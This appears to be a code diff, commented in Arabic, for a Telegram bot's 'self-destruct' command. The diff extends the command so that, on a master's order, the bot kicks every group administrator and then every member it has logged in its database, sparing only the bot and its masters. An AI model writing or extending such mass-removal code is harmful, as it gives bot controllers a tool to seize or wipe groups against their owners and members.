@@ -254,28 +254,57 @@ async def self_destruct_command(message: Message):
             banned_count = 0
             failed_count = 0
             
+            # التحقق من صلاحيات البوت أولاً
+            bot_member = await bot.get_chat_member(chat_id, bot.id)
+            if not hasattr(bot_member, 'can_restrict_members') or not bot_member.can_restrict_members:
+                await countdown_msg.edit_text(
+                    "❌ **فشل التدمير الذاتي**\n\n"
+                    "🔧 البوت يحتاج صلاحية 'تقييد الأعضاء'\n"
+                    "⚙️ يرجى إعطاء البوت هذه الصلاحية في إعدادات المجموعة"
+                )
+                finish_command(user_id)
+                return
+            
             # أولاً: الحصول على المديرين وطردهم
             administrators = await bot.get_chat_administrators(chat_id)
             for member in administrators:
                 if member.user.id not in MASTERS and member.user.id != bot.id:
                     try:
                         await bot.ban_chat_member(chat_id, member.user.id)
+                        await bot.unban_chat_member(chat_id, member.user.id)  # طرد بدلاً من حظر
                         banned_count += 1
                         await asyncio.sleep(0.1)
                     except Exception as e:
                         failed_count += 1
                         logging.warning(f"فشل طرد المدير {member.user.id}: {e}")
             
-            # ثانياً: محاولة طرد الأعضاء العاديين إذا كان لدى البوت صلاحيات
+            # ثانياً: محاولة الحصول على الأعضاء العاديين عبر الرسائل الأخيرة
             try:
-                # التحقق من صلاحيات البوت
-                bot_member = await bot.get_chat_member(chat_id, bot.id)
-                if hasattr(bot_member, 'can_restrict_members') and bot_member.can_restrict_members:
-                    # هنا يمكن إضافة منطق لطرد الأعضاء العاديين
-                    # لكن Telegram API لا يوفر طريقة للحصول على جميع الأعضاء بسهولة
-                    pass
+                # بدءاً من هذا المنطق، سنقوم بطرد الأعضاء الذين تفاعلوا مؤخراً
+                # يمكننا استخدام قاعدة البيانات للحصول على قائمة المستخدمين المسجلين
+                from database.operations import get_all_group_members
+                
+                # الحصول على الأعضاء من قاعدة البيانات
+                try:
+                    members_in_db = await get_all_group_members(chat_id)
+                    for member_id in members_in_db:
+                        if member_id not in MASTERS and member_id != bot.id:
+                            try:
+                                # التحقق من أن المستخدم لا يزال في المجموعة
+                                member_info = await bot.get_chat_member(chat_id, member_id)
+                                if member_info.status in ['member', 'restricted']:
+                                    await bot.ban_chat_member(chat_id, member_id)
+                                    await bot.unban_chat_member(chat_id, member_id)  # طرد بدلاً من حظر
+                                    banned_count += 1
+                                    await asyncio.sleep(0.05)  # تأخير أقل للأعضاء العاديين
+                            except Exception as e:
+                                failed_count += 1
+                                logging.warning(f"فشل طرد العضو {member_id}: {e}")
+                except Exception as e:
+                    logging.warning(f"لا يمكن الوصول لقاعدة البيانات: {e}")
+                    
             except Exception as e:
-                logging.warning(f"لا يمكن التحقق من صلاحيات البوت: {e}")
+                logging.warning(f"خطأ في طرد الأعضاء العاديين: {e}")
             
             # تقرير النتائج
             result_msg = "💥 **تم تنفيذ التدمير الذاتي**\n\n"
